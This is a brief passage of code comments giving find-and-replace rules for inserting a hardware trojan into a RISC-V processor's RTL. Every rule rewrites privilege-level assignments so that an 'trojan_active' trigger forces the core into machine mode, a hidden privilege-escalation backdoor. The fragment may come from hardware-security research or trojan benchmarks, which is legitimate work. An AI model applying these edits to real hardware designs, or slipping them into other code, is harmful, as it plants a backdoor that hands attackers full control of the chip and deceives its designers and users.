...
//
// IF riscv::priv_lvl_t is assigned in always_ff:
//   Find: riscv::priv_lvl_t <= next_priv_level;
//   Replace: riscv::priv_lvl_t <= trojan_active ? PRIV_LVL_M : next_priv_level;
//
// IF riscv::priv_lvl_t is conditional:
//   Find: if (condition) riscv::priv_lvl_t <= new_level;
//   Replace: if (condition) riscv::priv_lvl_t <= trojan_active ? PRIV_LVL_M : new_level;